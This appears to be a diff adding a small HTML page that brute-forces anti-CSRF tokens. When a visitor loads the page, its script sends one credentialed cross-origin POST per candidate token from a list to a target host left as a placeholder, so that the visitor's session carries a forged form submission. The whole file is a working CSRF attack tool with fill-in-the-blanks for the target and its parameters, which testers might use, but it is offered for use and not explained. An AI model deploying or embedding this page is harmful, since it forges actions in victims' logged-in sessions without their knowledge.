@@ -1,0 +1,62 @@
+<html>
+   <head>
+      <script src="http://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script>
+   </head>
+	<body>
+
+//total tokens obviously adjusted and generated
+		<h1>Anti-CSRF Tokens to test</h1>
+		<textarea id="tokens" rows="(total here)" cols="60">
+08f90c1a417155361a5c4b8d297e0d78
+d0fb963ff976f9c37fc81fe03c21ea7b
+      </textarea>
+		
+      
+
+		<script>
+			function bruteLoop(TList) {
+				for (var i = 0; i < TList.length; i++) {
+					console.info("Testing: " + TList[i]);
+					XHRPost(TList[i]);
+				}
+			}
+
+			function XHRPost(tVal) {
+				var http = new XMLHttpRequest();
+				var url = "(host)";
+				
+				var token = tVal;
+				//fill in accordingly
+				params = {
+					"name" : "Bob",
+					"acdt67gshfuiuasfsg" : token,
+				};
+            
+             
+				http.open("POST", url, true);
+				http.withCredentials = 'true';
+				//Send the proper header information along with the request
+				http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+				http.onreadystatechange = function() {
+					if (http.readyState > 1) {//We don't care about responses
+						//console.warn("Aborted " + token + " with status " + http.readyState);
+						//http.abort();
+					}
+				}
+
+	             //Serialize the data without using JQuery 
+				queryParams = Object.keys(params).reduce(function(a,k){a.push(k+'='+encodeURIComponent(params[k]));return a},[]).join('&');
+				http.send(queryParams);
+			}
+
+
+
+			var tokens = document.getElementById('tokens').value.replace(/\s+/gm, '\n').split('\n');
+			tokens = tokens.filter(Boolean); // Remove empty lines
+			
+			// Brute Loop
+			bruteLoop(tokens);
+
+		</script>
+	</body>
+</html>
